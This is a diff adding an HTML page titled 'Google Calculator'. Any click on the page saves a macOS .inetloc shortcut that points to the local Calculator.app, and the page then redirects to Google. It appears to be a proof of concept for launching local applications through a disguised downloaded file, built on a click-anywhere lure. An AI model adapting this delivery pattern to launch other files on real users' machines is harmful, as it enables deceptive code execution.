@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Calculator</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #0f0f23;
+      color: #00ff88;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      cursor: pointer;
+    }
+    h1 {
+      font-size: 3.5rem;
+      margin-bottom: 1.5rem;
+      color: #5fff87;
+      text-shadow: 0 0 10px #00ff88;
+    }
+    p {
+      font-size: 1.4rem;
+      max-width: 700px;
+      line-height: 1.6;
+      margin-bottom: 2rem;
+    }
+    .hint {
+      margin-top: 2rem;
+      font-size: 1.1rem;
+      color: #aaa;
+      opacity: 0.8;
+    }
+    .status {
+      margin-top: 2rem;
+      font-size: 1.2rem;
+      color: #ffd166;
+    }
+    button {
+      padding: 18px 50px;
+      font-size: 1.8rem;
+      background: #00ff88;
+      color: #000;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 10px 40px rgba(0,255,136,0.4);
+      transition: all 0.3s;
+    }
+    button:hover {
+      background: #00e676;
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <h1>Click Anywhere</h1>
+  <p>
+    Click anywhere on this page to trigger the file saver.<br>
+    The file will be saved as <strong>Google Calculator.inetloc</strong>.<br>
+    After saving, the page will redirect to Google.
+  </p>
+  <button onclick="saveInetloc()">Save .inetloc Now</button>
+  <p class="hint">
+    After saving → you will be redirected. Check Downloads and double-click the file to launch Calculator.
+  </p>
+  <div class="status" id="status">Waiting for click...</div>
+
+  <script>
+    const status = document.getElementById('status');
+
+    async function saveInetloc() {
+      status.textContent = "Preparing .inetloc file...";
+
+      if ('showSaveFilePicker' in window) {
+        try {
+          const handle = await window.showSaveFilePicker({
+            suggestedName: 'Google Calculator.inetloc',
+            types: [{
+              description: 'Internet Location File',
+              accept: { 'application/internet-shortcut': ['.inetloc', '.url'] }
+            }],
+          });
+
+          const content = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>URL</key>
+  <string>file:///System/Applications/Calculator.app</string>
+</dict>
+</plist>`;
+
+          const writable = await handle.createWritable();
+          await writable.write(content);
+          await writable.close();
+
+          status.textContent = "Success! File saved. Redirecting...";
+
+        } catch (err) {
+          status.textContent = "Error saving file: " + err.name;
+          console.error(err);
+        }
+      } else {
+        status.textContent = "Warning: showSaveFilePicker not supported in this browser.";
+      }
+
+      // Redirect after 1 second (same as your original timing)
+      setTimeout(() => {
+        window.location.href = 'https://google.com';
+      }, 1000);
+    }
+
+    // Click anywhere also triggers
+    document.addEventListener('click', saveInetloc);
+  </script>
+</body>
+</html>
